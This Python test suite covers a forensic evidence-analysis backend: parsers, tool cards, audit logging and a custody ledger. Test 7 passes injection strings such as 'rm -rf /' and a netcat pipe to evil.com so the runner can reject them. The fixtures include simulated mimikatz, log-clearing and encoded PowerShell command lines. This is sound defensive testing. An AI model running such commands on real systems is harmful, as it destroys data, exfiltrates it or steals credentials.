"""Phase 2 Test Suite: Two-Tier Parsing, YAML Tool Adapters, Auto-Mapper & Smart Column Projection.

Tests:
1. ForensicFinding and CitedClaim validation (anti-hallucination citation enforcement).
2. Declarative ToolPluginCard YAML serialization and validation.
3. Pre-built YAML Tool Cards in plugins/ (EvtxECmd, RECmd, Chainsaw, Volatility 3, YARA).
4. Smart Column Projection and Zero Silent Sampling audit.jsonl logging.
5. Visual Tool Dry-Run Auto-Mapper heuristics and confidence scoring.
6. Air-Gapped Subprocess Runner with shell=False and timeout enforcement.
7. Tier A Dissect Adapter: offline disk stream, EVTX, Registry, and collector artifacts.
8. Tier B Plugin Runner lifecycle with Custody Engine integration.
"""
from __future__ import annotations

import json
import os
import struct
import sys
import time
from pathlib import Path
import pytest
import yaml

from backend.app.core.auto_mapper import DryRunAutoMapper
from backend.app.core.column_projector import SmartColumnProjector
from backend.app.core.custody_engine import CustodyEngine, safe_make_writable
from backend.app.core.dissect_adapter import DissectAdapter
from backend.app.core.exceptions import ForensicOpsError
from backend.app.core.plugin_runner import AirGappedSubprocessRunner, PluginRunner
from backend.app.models.custody import ArtifactRecord
from backend.app.models.findings import CitedClaim, ForensicFinding
from backend.app.models.plugins import ToolExecutionResult, ToolPluginCard


@pytest.fixture
def temp_workspace(tmp_path):
    """Provide a clean temporary workspace for evidence and outputs."""
    workspace = tmp_path / "workspace"
    workspace.mkdir(parents=True, exist_ok=True)
    yield workspace
    for root, dirs, files in os.walk(workspace):
        for f in files:
            safe_make_writable(Path(root) / f)


@pytest.fixture
def mock_artifact(temp_workspace):
    """Create a mock ingested evidence artifact blob."""
    blob_file = temp_workspace / "sample_evidence.blob"
    blob_file.write_bytes(b"dummy evidence payload for testing")
    return ArtifactRecord(
        case_id="case_101",
        type="evtx",
        original_path="C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
        blob_path=str(blob_file),
        size_bytes=blob_file.stat().st_size,
        sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        sha512="cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e",
        acquisition_method="offline_copy",
    )


# ------------------------------------------------------------------------------
# Test 1: ForensicFinding Model & Untrusted Evidence XML Wrapper (Nonce IPI Shield)
# ------------------------------------------------------------------------------
def test_forensic_finding_model_and_xml_nonce():
    """Verify ForensicFinding immutability, fields, and <untrusted_evidence_data nonce="..."> wrapper."""
    finding = ForensicFinding(
        case_id="case_101",
        source_artifact_id="art_001",
        source_artifact_hash="abc123sha256",
        tool_id="ez_evtxecmd",
        timestamp_utc="2026-10-31T06:00:00Z",
        artifact_type="evtx",
        category="process_creation",
        event_id="4688",
        severity="high",
        host="WORKSTATION-01",
        user="CORP\\jdoe",
        process_name="cmd.exe",
        command_line="cmd.exe /c powershell -enc JAB...",
        summary="Suspicious encoded command execution",
        projected_data={"CommandLine": "cmd.exe /c powershell -enc JAB..."},
    )

    assert finding.finding_id is not None
    assert finding.severity == "high"

    # Frozen immutability check
    with pytest.raises(Exception):
        finding.severity = "low"  # type: ignore

    # Verify IPI XML tag generation
    xml_output = finding.to_evidence_xml(nonce="secure_nonce_42")
    assert xml_output.startswith('<untrusted_evidence_data nonce="secure_nonce_42">')
    assert xml_output.endswith('</untrusted_evidence_data>')
    assert "jdoe" in xml_output
    assert "abc123sha256" in xml_output


# ------------------------------------------------------------------------------
# Test 2: CitedClaim Anti-Hallucination Citation Enforcement
# ------------------------------------------------------------------------------
def test_cited_claim_citation_enforcement():
    """Verify that observed_fact and derived_correlation must cite evidence IDs, while hypothesis does not."""
    # 1. observed_fact without citations MUST fail validation
    with pytest.raises(ValueError, match="requires at least one non-empty finding_id"):
        CitedClaim(
            claim_type="observed_fact",
            statement="Attacker executed mimikatz at 06:12 UTC",
            citing_finding_ids=[],
            source_artifact_hashes=["hash1"],
        )

    with pytest.raises(ValueError, match="requires at least one non-empty source_artifact_hash"):
        CitedClaim(
            claim_type="observed_fact",
            statement="Attacker executed mimikatz at 06:12 UTC",
            citing_finding_ids=["finding_123"],
            source_artifact_hashes=[],
        )

    # 2. derived_correlation without citations MUST fail validation
    with pytest.raises(ValueError, match="requires at least one non-empty finding_id"):
        CitedClaim(
            claim_type="derived_correlation",
            statement="User jdoe credentials were compromised via pass-the-hash",
            citing_finding_ids=[],
            source_artifact_hashes=["hash1"],
        )

    # 3. hypothesis and recommendation CAN be created without findings
    hypo = CitedClaim(
        claim_type="hypothesis",
        statement="Attacker may have moved laterally to domain controller via SMB",
    )
    assert hypo.claim_type == "hypothesis"
    assert hypo.citing_finding_ids == []

    # 4. Valid cited fact succeeds
    valid_fact = CitedClaim(
        claim_type="observed_fact",
        statement="Event 4688 logged process creation for powershell.exe",
        citing_finding_ids=["finding_456"],
        source_artifact_hashes=["sha256_evidence_hash"],
        confidence=0.99,
        why_it_matters="Execution of unauthorized script runner",
    )
    assert valid_fact.statement == "Event 4688 logged process creation for powershell.exe"
    assert len(valid_fact.citing_finding_ids) == 1


# ------------------------------------------------------------------------------
# Test 3: ToolPluginCard YAML Roundtrip & Validation
# ------------------------------------------------------------------------------
def test_tool_plugin_card_yaml_roundtrip(tmp_path):
    """Test ToolPluginCard loading, validation, and serialization."""
    card_path = tmp_path / "custom_tool.yaml"
    plugin = ToolPluginCard(
        tool_id="test_parser",
        name="Test Parser Tool",
        version="1.0.0",
        description="A test tool card for validation",
        category="event_log",
        supported_artifact_types=["evtx"],
        execution_tier="tier_b_adapter",
        command_template=["test_bin", "-i", "{input_path}", "-o", "{output_dir}"],
        field_map={"Time": "timestamp_utc", "Msg": "summary"},
        ai_keep_fields=["Time", "Msg", "PID"],
        timeout_seconds=120,
    )
    plugin.to_yaml_file(card_path)

    loaded = ToolPluginCard.from_yaml_file(card_path)
    assert loaded.tool_id == "test_parser"
    assert loaded.timeout_seconds == 120
    assert loaded.field_map["Time"] == "timestamp_utc"
    assert "PID" in loaded.ai_keep_fields


# ------------------------------------------------------------------------------
# Test 4: Verify Pre-Built YAML Tool Cards in plugins/
# ------------------------------------------------------------------------------
def test_all_prebuilt_tool_cards_exist_and_valid():
    """Verify that all 5 pre-built tool cards in plugins/ exist and pass schema validation."""
    plugins_dir = Path("plugins").resolve()
    expected_cards = [
        "ez_evtxecmd.yaml",
        "ez_recmd.yaml",
        "chainsaw_sigma.yaml",
        "volatility3_pslist.yaml",
        "yara_scanner.yaml",
    ]

    for card_name in expected_cards:
        card_file = plugins_dir / card_name
        assert card_file.is_file(), f"Missing tool card: {card_file}"

        card = ToolPluginCard.from_yaml_file(card_file)
        assert card.tool_id is not None
        assert card.name is not None
        assert card.version is not None
        assert len(card.supported_artifact_types) > 0
        assert len(card.command_template) > 0
        assert len(card.ai_keep_fields) > 0
        assert len(card.field_map) > 0
        assert card.timeout_seconds > 0


# ------------------------------------------------------------------------------
# Test 5: Smart Column Projection & Zero Silent Sampling in audit.jsonl
# ------------------------------------------------------------------------------
def test_smart_column_projection_and_audit(temp_workspace):
    """Verify ~70% column reduction and exact before/after metrics written to audit.jsonl."""
    audit_file = temp_workspace / "audit.jsonl"
    projector = SmartColumnProjector(default_audit_log_path=audit_file)

    # Synthesize raw rows with 15 columns (high-signal forensic data + internal noise)
    raw_rows = [
        {
            "TimeCreated": "2026-10-31T06:15:00Z",
            "EventId": 4688,
            "Computer": "PC-FINANCE-01",
            "UserName": "jdoe",
            "ExecutableInfo": "cmd.exe",
            "CommandLine": "cmd.exe /c whoami",
            "ParentProcessName": "explorer.exe",
            "InternalChunkId": 104,
            "RawOpcode": 0x21,
            "PaddingBytes": "00000000",
            "Guid": "{12345678-1234-1234-1234-123456789abc}",
            "ReservedField1": None,
            "ReservedField2": 0,
            "Version": "1.0",
            "RecordOffset": 8192,
        }
        for _ in range(10)
    ]

    ai_keep_fields = [
        "TimeCreated",
        "EventId",
        "Computer",
        "UserName",
        "ExecutableInfo",
        "CommandLine",
        "ParentProcessName",
    ]

    projected_rows, metrics = projector.project_rows(
        raw_rows=raw_rows,
        ai_keep_fields=ai_keep_fields,
        field_map={"TimeCreated": "timestamp_utc", "EventId": "event_id"},
        case_id="case_101",
        tool_id="test_evtx_projector",
        source_artifact_id="art_001",
        raw_output_path=str(temp_workspace / "raw.json"),
        audit_log_path=audit_file,
    )

    assert len(projected_rows) == 10
    # Every projected row should only contain high-signal columns
    assert set(projected_rows[0].keys()) == set(ai_keep_fields)
    assert "InternalChunkId" not in projected_rows[0]
    assert "PaddingBytes" not in projected_rows[0]

    # Metrics check
    assert metrics["raw_columns_count"] == 15
    assert metrics["projected_columns_count"] == 7
    assert metrics["columns_reduction_percentage"] > 50.0  # (1 - 7/15) ~ 53.33%

    # Verify audit.jsonl entry
    assert audit_file.is_file()
    lines = audit_file.read_text(encoding="utf-8").strip().splitlines()
    assert len(lines) == 1
    audit_data = json.loads(lines[0])
    assert audit_data["action"] == "smart_column_projection"
    assert audit_data["details"]["raw_rows_count"] == 10
    assert audit_data["details"]["raw_columns_count"] == 15
    assert audit_data["details"]["projected_columns_count"] == 7


# ------------------------------------------------------------------------------
# Test 6: Dry-Run Auto-Mapper Heuristics & Confidence Scoring
# ------------------------------------------------------------------------------
def test_dry_run_auto_mapper_heuristics():
    """Verify that auto-mapper correctly suggests field_map and ai_keep_fields on 5 sample rows."""
    auto_mapper = DryRunAutoMapper()

    sample_rows = [
        {
            "TimeCreated": "2026-10-31T06:20:00Z",
            "EventId": 4688,
            "Computer": "DESKTOP-ALPHA",
            "SubjectUserName": "admin",
            "ProcessName": "powershell.exe",
            "CommandLine": "powershell.exe -NoP -W Hidden -Command Get-Process",
            "ParentProcessName": "cmd.exe",
            "Severity": "high",
            "Payload": "Process creation event",
            "InternalGuid": "e7b0d2d3-1234",
            "ChunkVersion": 2,
        }
        for _ in range(5)
    ]

    result = auto_mapper.analyze_sample_rows(sample_rows)
    assert result.total_columns_inspected == 11

    # Verify suggested field mappings
    assert result.suggested_field_map.get("TimeCreated") == "timestamp_utc"
    assert result.suggested_field_map.get("EventId") == "event_id"
    assert result.suggested_field_map.get("Computer") == "host"
    assert result.suggested_field_map.get("SubjectUserName") == "user"
    assert result.suggested_field_map.get("ProcessName") == "process_name"
    assert result.suggested_field_map.get("CommandLine") == "command_line"

    # Verify confidence scores
    for col in ("TimeCreated", "EventId", "Computer", "CommandLine"):
        assert result.confidence_scores[col] >= 0.70

    # Verify noise fields are excluded from suggested ai_keep_fields
    assert "InternalGuid" not in result.suggested_ai_keep_fields
    assert "ChunkVersion" not in result.suggested_ai_keep_fields
    # High-signal parent process should be retained
    assert "ParentProcessName" in result.suggested_ai_keep_fields

    # Verify sample projected rows
    assert len(result.sample_projected_rows) == 5
    assert "InternalGuid" not in result.sample_projected_rows[0]


# ------------------------------------------------------------------------------
# Test 7: Air-Gapped Subprocess Runner: shell=False & Injection Defense
# ------------------------------------------------------------------------------
def test_air_gapped_subprocess_shell_false_and_injection_defense(temp_workspace):
    """Verify strict shell=False enforcement and defense against shell metacharacters."""
    runner = AirGappedSubprocessRunner()

    # 1. Non-list argv must be rejected
    with pytest.raises(ForensicOpsError, match="argv must be a list"):
        runner.execute("echo malicious", cwd=temp_workspace)  # type: ignore

    # 2. Empty argv must be rejected
    with pytest.raises(ForensicOpsError, match="Cannot execute empty command array"):
        runner.execute([], cwd=temp_workspace)

    # 3. Arguments containing command injection metacharacters must be rejected
    with pytest.raises(ForensicOpsError, match="Potentially unsafe shell metacharacter"):
        runner.execute(["safe_bin", "-f", "test.evtx; rm -rf /"], cwd=temp_workspace)

    with pytest.raises(ForensicOpsError, match="Potentially unsafe shell metacharacter"):
        runner.execute(["safe_bin", "-f", "test.evtx | nc evil.com 4444"], cwd=temp_workspace)


# ------------------------------------------------------------------------------
# Test 8: Air-Gapped Subprocess Runner: Timeout Enforcement
# ------------------------------------------------------------------------------
def test_air_gapped_subprocess_timeout(temp_workspace):
    """Verify that hanging processes are terminated when timeout_seconds is reached."""
    runner = AirGappedSubprocessRunner()

    # Execute a command that sleeps longer than timeout_seconds
    py_sleep_cmd = [
        sys.executable,
        "-c",
        "__import__('time').sleep(5)",
    ]
    # Set timeout to 1 second
    with pytest.raises(ForensicOpsError, match="timed out"):
        runner.execute(py_sleep_cmd, cwd=temp_workspace, timeout_seconds=1)


# ------------------------------------------------------------------------------
# Test 9: Tier A Dissect Adapter: Offline Disk Stream (Zero Kernel Mount)
# ------------------------------------------------------------------------------
def test_tier_a_dissect_userspace_disk_stream(temp_workspace):
    """Verify reading disk image partition tables in userspace without OS kernel mounting."""
    adapter = DissectAdapter()

    # Synthesize a 1MB raw disk image with valid MBR header
    disk_img = temp_workspace / "evidence_disk.raw"
    mbr_data = bytearray(1024 * 1024)  # 1MB zeroes

    # Partition 1 at offset 446: Bootable, Type 0x07 (NTFS), LBA 2048, Size 1000 sectors
    # struct format: "<B3sB3sII"
    entry1 = struct.pack("<B3sB3sII", 0x80, b"\x00\x00\x00", 0x07, b"\x00\x00\x00", 2048, 1000)
    mbr_data[446 : 446 + 16] = entry1
    mbr_data[510:512] = b"\x55\xaa"  # MBR signature
    disk_img.write_bytes(mbr_data)

    findings = adapter.parse_disk_image_stream(
        image_path=disk_img,
        case_id="case_101",
        artifact_id="art_disk_01",
        artifact_hash="sha256_disk_hash",
    )

    assert len(findings) == 1
    f = findings[0]
    assert f.artifact_type == "raw_image"
    assert f.category == "disk_partition"
    assert f.raw_reference == "MBR_Partition_1"
    assert f.projected_data["type_hex"] == "0x07"
    assert f.projected_data["bootable"] is True
    assert f.projected_data["size_bytes"] == 1000 * 512


# ------------------------------------------------------------------------------
# Test 10: Tier A Dissect Adapter: EVTX Chunk & Event Parsing
# ------------------------------------------------------------------------------
def test_tier_a_dissect_evtx_parsing(temp_workspace):
    """Verify parsing binary EVTX chunks or structured EVTX fallback."""
    adapter = DissectAdapter()

    # Create structured EVTX fallback log file
    evtx_file = temp_workspace / "Application.evtx"
    sample_events = [
        {
            "TimeCreated": "2026-10-31T06:30:00Z",
            "EventId": "1000",
            "Computer": "HOST-TEST",
            "UserName": "SYSTEM",
            "ExecutableInfo": "appcrash.exe",
            "CommandLine": "appcrash.exe --silent",
            "Payload": "Application crash event logged",
        },
        {
            "TimeCreated": "2026-10-31T06:31:00Z",
            "EventId": "7045",
            "Computer": "HOST-TEST",
            "UserName": "SYSTEM",
            "ExecutableInfo": "evilservice.exe",
            "CommandLine": "evilservice.exe -k run",
            "Payload": "A new service was installed in the system",
        },
    ]
    with open(evtx_file, "w", encoding="utf-8") as f:
        for ev in sample_events:
            f.write(json.dumps(ev) + "\n")

    findings = adapter.parse_evtx(
        file_path=evtx_file,
        case_id="case_101",
        artifact_id="art_evtx_01",
        artifact_hash="sha256_evtx_hash",
    )

    assert len(findings) == 2
    f2 = findings[1]
    assert f2.event_id == "7045"
    assert f2.process_name == "evilservice.exe"
    assert f2.command_line == "evilservice.exe -k run"
    assert f2.host == "HOST-TEST"


# ------------------------------------------------------------------------------
# Test 11: Tier A Dissect Adapter: Windows Registry Hive Parsing
# ------------------------------------------------------------------------------
def test_tier_a_dissect_registry_parsing(temp_workspace):
    """Verify parsing Windows Registry REGF header and persistence keys."""
    adapter = DissectAdapter()

    # Create binary REGF hive header
    hive_file = temp_workspace / "SYSTEM.hiv"
    regf_header = bytearray(4096)
    regf_header[:4] = b"regf"
    # Windows FILETIME for approx 2026 (0x01DC000000000000)
    struct.pack_into("<Q", regf_header, 12, 133500000000000000)
    hive_file.write_bytes(regf_header)

    findings = adapter.parse_registry_hive(
        hive_path=hive_file,
        case_id="case_101",
        artifact_id="art_reg_01",
        artifact_hash="sha256_reg_hash",
    )

    assert len(findings) == 1
    f = findings[0]
    assert f.artifact_type == "registry"
    assert f.category == "registry_hive"
    assert f.raw_reference == "REGF_Header"
    assert f.projected_data["hive_name"] == "SYSTEM.hiv"


# ------------------------------------------------------------------------------
# Test 12: Tier A Dissect Adapter: Collector Capsule JSONL Parsing
# ------------------------------------------------------------------------------
def test_tier_a_dissect_collector_artifact_parsing(temp_workspace):
    """Verify parsing collector capsule JSONL extracts (processes, network)."""
    adapter = DissectAdapter()

    proc_file = temp_workspace / "running_processes.jsonl"
    proc_data = [
        {
            "timestamp_utc": "2026-10-31T06:40:00Z",
            "process_name": "mimikatz.exe",
            "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"",
            "user": "NT AUTHORITY\\SYSTEM",
            "pid": 5824,
            "ppid": 1024,
        },
        {
            "timestamp_utc": "2026-10-31T06:41:00Z",
            "process_name": "svchost.exe",
            "command_line": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
            "user": "NT AUTHORITY\\SYSTEM",
            "pid": 1112,
            "ppid": 628,
        },
    ]
    with open(proc_file, "w", encoding="utf-8") as f:
        for p in proc_data:
            f.write(json.dumps(p) + "\n")

    findings = adapter.parse_collector_artifact(
        file_path=proc_file,
        case_id="case_101",
        artifact_id="art_proc_01",
        artifact_hash="sha256_proc_hash",
    )

    assert len(findings) == 2
    f1 = findings[0]
    assert f1.process_name == "mimikatz.exe"
    assert f1.category == "process_list"
    assert "privilege::debug" in (f1.command_line or "")


# ------------------------------------------------------------------------------
# Test 13: Tier B Plugin Runner Full Lifecycle with Custody Ledger
# ------------------------------------------------------------------------------
def test_tier_b_plugin_runner_lifecycle_and_custody(temp_workspace, mock_artifact):
    """Verify execution of Tier B tool plugin, column projection, audit log, and custody recording."""
    audit_file = temp_workspace / "audit.jsonl"
    custody_db = temp_workspace / "custody.db"
    vault_dir = temp_workspace / "vault"
    vault_dir.mkdir(parents=True, exist_ok=True)

    custody_engine = CustodyEngine(vault_root=vault_dir, db_path=custody_db)
    subprocess_runner = AirGappedSubprocessRunner()

    # Register a mock handler simulating Eric Zimmerman EvtxECmd JSONL output
    def mock_evtxecmd_handler(argv, input_dir, output_dir):
        out_file = output_dir / "EvtxECmd_Output.jsonl"
        mock_records = [
            {
                "TimeCreated": "2026-10-31T06:50:00Z",
                "EventId": 4624,
                "Computer": "DC-PRIMARY",
                "UserName": "Administrator",
                "ExecutableInfo": "winlogon.exe",
                "CommandLine": "winlogon.exe",
                "RecordNumber": 99201,
                "Payload": "Successful logon of Administrator via RDP",
                "ParentProcessName": "smss.exe",
                "RawInternalGuid": "{abc-123}",
            },
            {
                "TimeCreated": "2026-10-31T06:51:00Z",
                "EventId": 1102,
                "Computer": "DC-PRIMARY",
                "UserName": "Administrator",
                "ExecutableInfo": "wevtsvc.dll",
                "CommandLine": "wevtutil cl Security",
                "RecordNumber": 99202,
                "Payload": "The audit log was cleared",
                "ParentProcessName": "services.exe",
                "RawInternalGuid": "{def-456}",
            },
        ]
        with open(out_file, "w", encoding="utf-8") as f:
            for r in mock_records:
                f.write(json.dumps(r) + "\n")
        return 0, "EvtxECmd processed 2 records successfully", ""

    subprocess_runner.register_mock_tool("evtxecmd.exe", mock_evtxecmd_handler)

    plugin_runner = PluginRunner(
        subprocess_runner=subprocess_runner,
        audit_log_path=audit_file,
        custody_engine=custody_engine,
    )

    # Load pre-built tool card
    plugin_card = ToolPluginCard.from_yaml_file("plugins/ez_evtxecmd.yaml")

    result = plugin_runner.run_plugin(
        plugin=plugin_card,
        artifact=mock_artifact,
        output_workspace=temp_workspace,
    )

    # 1. Verify execution telemetry
    assert result.success is True
    assert result.exit_code == 0
    assert result.findings_count == 2
    assert result.raw_rows_count == 2
    assert result.projected_rows_count == 2

    # 2. Verify findings normalization and severity mapping
    findings = result.findings
    assert len(findings) == 2
    f_logon = findings[0]
    assert f_logon.event_id == "4624"
    assert f_logon.host == "DC-PRIMARY"
    assert f_logon.user == "Administrator"

    f_cleared = findings[1]
    assert f_cleared.event_id == "1102"
    # EventId 1102 is mapped to 'critical' in ez_evtxecmd.yaml
    assert f_cleared.severity == "critical"
    assert "RawInternalGuid" not in f_cleared.projected_data

    # 3. Verify audit.jsonl recorded smart projection
    assert audit_file.is_file()
    audit_lines = audit_file.read_text(encoding="utf-8").strip().splitlines()
    assert len(audit_lines) >= 1
    last_audit = json.loads(audit_lines[-1])
    assert last_audit["action"] == "smart_column_projection"
    assert last_audit["details"]["tool_id"] == "ez_evtxecmd"

    # 4. Verify custody ledger recorded tool execution
    ledger_entries = custody_engine.get_custody_chain(mock_artifact.case_id)
    assert any(entry.action == "executed_tool_ez_evtxecmd" for entry in ledger_entries)
    # Tamper check must pass
    is_valid, errors = custody_engine.verify_chain_integrity()
    assert is_valid is True
    assert len(errors) == 0
